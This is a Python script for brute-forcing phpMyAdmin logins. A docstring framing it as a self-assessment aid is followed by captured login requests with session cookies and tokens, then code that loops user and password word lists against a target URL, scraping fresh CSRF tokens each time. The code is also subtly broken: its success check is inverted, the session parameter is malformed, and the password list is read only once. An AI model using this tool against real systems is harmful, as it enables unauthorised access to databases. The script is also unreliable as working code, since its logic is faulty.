'''
This script was developed from example of brute forcing phpmyadmin site to assisst in developing similar Tools for self
assessment of own web applications

#POST1

Cookie: phpMyAdmin=bde288434629d8f3e69b26d107633223


set_session=bde288434629d8f3e69b26d107633223&pma_username=ok&pma_password=okasd&server=1&target=index.php&lang=en&debug=0&token=a3809bbcae52f70e6beeef86b20ff414


# Resp1


Set-Cookie: phpMyAdmin=bde288434629d8f3e69b26d107633223; path=/
Set-Cookie: phpMyAdmin=51094657b2bc41758bccb0c61d6d6da1; path=/


   <input type="hidden" name="token" value="b6827a7ae7418c42e289d9213a75c482">


# POST 2



Cookie: phpMyAdmin=51094657b2bc41758bccb0c61d6d6da1


set_session=51094657b2bc41758bccb0c61d6d6da1&pma_username=sdfg&pma_password=sdfgdfgsdfg&server=1&target=index.php&lang=en&debug=0&token=b6827a7ae7418c42e289d9213a75c482


#######

So need to write a python program that does following:

1. grabs from every response the token from html body 
AND second cookie in RESPONSE which is not equal to the cookie from initial POST request

2. make a POST request with

set_session=CURRENT_COOKIE&pma_username=root&pma_password=PASS_LIST&server=1&target=index.php&lang=en&debug=0&token=FORM_TOKEN

3. evaluate to not have "Login Failed" in reposnse body
'''

import requests
import re
#import base64
import sys

URL = sys.argv[1]
USER_FILE = sys.argv[2]
PASS_FILE = sys.argv[3]
#INIT_TOKEN = sys.argv[4]
#INIT_COOKIE = sys.argv[5]

def forge_post(url, token, cookie, username, password):

    cookie = {
        "phpMyAdmin":cookie,
    }

    payload ={
        "set_session" : cookie,
        "pma_username" :  username,
        "pma_password" : password,
        "server" : 1,
        "target" : "index.php",
        "lang" : "en",
        "debug" : 0,
        "token" : token
    }


    resp = requests.post(url, data=payload, cookies=cookie)

    return resp

def analyze_resp(resp):

    password_correct = False
    
    #extract response cookie from set_session in html body

    session_match = re.search(r'set_session" value="([a-f0-9]+)"', resp.text)
    
    if session_match:
        next_cookie = session_match.group(1)
        print("set_session cookie:", next_cookie)
    else:
        return 0

    #extract response cookie from token in html body

    token_match = re.search(r'token" value="([a-f0-9]+)"', resp.text)
    
    if token_match:
        token = token_match.group(1)
        print("Token value:", token)
    else:
        return 0

    # search for positive password feedback in html body

    pass_match = re.search(r'Login Failed', resp.text)

    if pass_match:
        password_correct = True

    return (next_cookie, token, password_correct)


###########################################MAIN#############################################

def main():

    #initial GET request
    resp = requests.get(URL)
    (cookie, token, password_correct) = analyze_resp(resp)

    with open(USER_FILE,"r") as u:
        with open(PASS_FILE,"r") as f:

            for user in u.readlines():
                # password match flag
                password_correct = False

                for password in f.readlines():
                    resp = forge_post(URL, token, cookie, user, password)
                    (cookie, token, password_correct) = analyze_resp(resp)
                    if password_correct:
                        print(f"[+] Password match! {user}:{password}")
                        break


    return 0


if __name__ == "__main__":
    main()